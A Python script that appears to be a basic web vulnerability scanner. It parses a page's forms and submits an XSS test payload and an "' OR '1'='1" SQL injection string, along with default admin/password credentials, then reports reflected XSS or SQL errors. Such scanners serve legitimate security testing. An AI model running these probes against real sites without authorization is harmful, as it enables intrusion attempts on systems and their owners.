import requests
from bs4 import BeautifulSoup

XSS_PAYLOAD = "<script>alert('xss')</script>"
SQLI_PAYLOAD = "' OR '1'='1"

def extract_forms(url):
    try:
        res = requests.get(url, timeout=10, verify=False)
        soup = BeautifulSoup(res.text, "html.parser")
        return soup.find_all("form")
    except Exception:
        return []

def get_form_details(form):
    details = {"action": "", "method": "get", "inputs": []}
    try:
        details["action"] = form.attrs.get("action", "").strip()
        details["method"] = form.attrs.get("method", "get").lower()

        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type", "text")
            name = input_tag.attrs.get("name")
            value = input_tag.attrs.get("value", "")
            if name:
                details["inputs"].append({"type": input_type, "name": name, "value": value})
    except Exception:
        pass
    return details

def submit_form(form_details, url, payload):
    target_url = url if form_details["action"] in ["", "#"] else requests.compat.urljoin(url, form_details["action"])
    data = {}

    for input in form_details["inputs"]:
        if input["type"] == "submit":
            continue
        if "user" in input["name"].lower():
            data[input["name"]] = "admin"
        elif "pass" in input["name"].lower():
            data[input["name"]] = "password"
        else:
            data[input["name"]] = payload

    try:
        if form_details["method"] == "post":
            return requests.post(target_url, data=data, timeout=10, verify=False)
        else:
            return requests.get(target_url, params=data, timeout=10, verify=False)
    except Exception:
        return None

def test_post_xss(url):
    forms = extract_forms(url)
    for form in forms:
        details = get_form_details(form)
        response = submit_form(details, url, XSS_PAYLOAD)
        if response and XSS_PAYLOAD in response.text:
            return f"🔥 Reflected XSS via POST form at {url}"
    return "✅ No POST XSS found."

def test_post_sqli(url):
    forms = extract_forms(url)
    for form in forms:
        details = get_form_details(form)
        response = submit_form(details, url, SQLI_PAYLOAD)
        if response and ("error" in response.text.lower() or "syntax" in response.text.lower()):
            return f"🔥 SQL Injection via POST form at {url}"
    return "✅ No POST SQLi found."
